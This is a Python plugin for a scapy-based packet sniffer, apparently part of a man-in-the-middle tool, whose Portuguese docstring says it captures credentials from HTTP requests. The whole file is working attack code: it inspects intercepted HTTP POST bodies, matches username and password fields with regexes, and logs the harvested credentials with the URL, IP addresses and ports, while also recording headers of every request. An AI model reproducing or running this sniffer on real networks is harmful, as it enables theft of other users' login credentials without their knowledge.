from scapy.all import ARP, Ether, Raw, TCP, IP 
from plugins.base import BasePlugin
from scapy_http import http
import re

class HTTPPacket(BasePlugin):
    """ pega as credenciais de uma requisicao http GET ou POST """
    _name = 'HTTPPacket'
    _activated = False
    _output = []

    def __init__(self):
        pass

    @staticmethod
    def getName():
        return HTTPPacket._name

    def getActivated(self):
        return self._activated

    def setActivated(self, status):
        self._activated = status

    def getLogger(self):
        return self._output

    def writeLogger(self, log):
        print('[*] {}'.format(log))
        self._output.append(log)



    def getCredentials_POST(self,payload,url,header,dport,sport):
        user_regex = '([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|' \
        '[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
        pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|' \
        '[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)'
        username = re.findall(user_regex, payload)
        password = re.findall(pw_regex, payload)
        print(payload)
        if not username ==[] and not password == []:
            self.writeLogger({'POSTCreds':{'User':username[0][1],
            'Pass': password[0][1],'Url':str(url),'Destination':'{}/{}'.format(sport,dport)}})


    def ParserPackets(self, pkt):
        if not pkt.haslayer(http.HTTPRequest):
            return
        try:
            if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
                self.dport = pkt[TCP].dport
                self.sport = pkt[TCP].sport
                self.src_ip_port = str(pkt[IP].src) + ':' + str(self.sport)
                self.dst_ip_port = str(pkt[IP].dst) + ':' + str(self.dport)

            http_layer = pkt.getlayer(http.HTTPRequest)
            ip_layer = pkt.getlayer(IP)
            
            if http_layer.fields['Method'].decode() == 'POST':
                self.getCredentials_POST(pkt.getlayer(Raw).load.decode(), http_layer.fields['Host'],
                http_layer.fields['Headers'], self.dst_ip_port, self.src_ip_port)

            return self.writeLogger({'urlsCap':{'IP': ip_layer.fields, 'Headers': http_layer.fields}})
        except: pass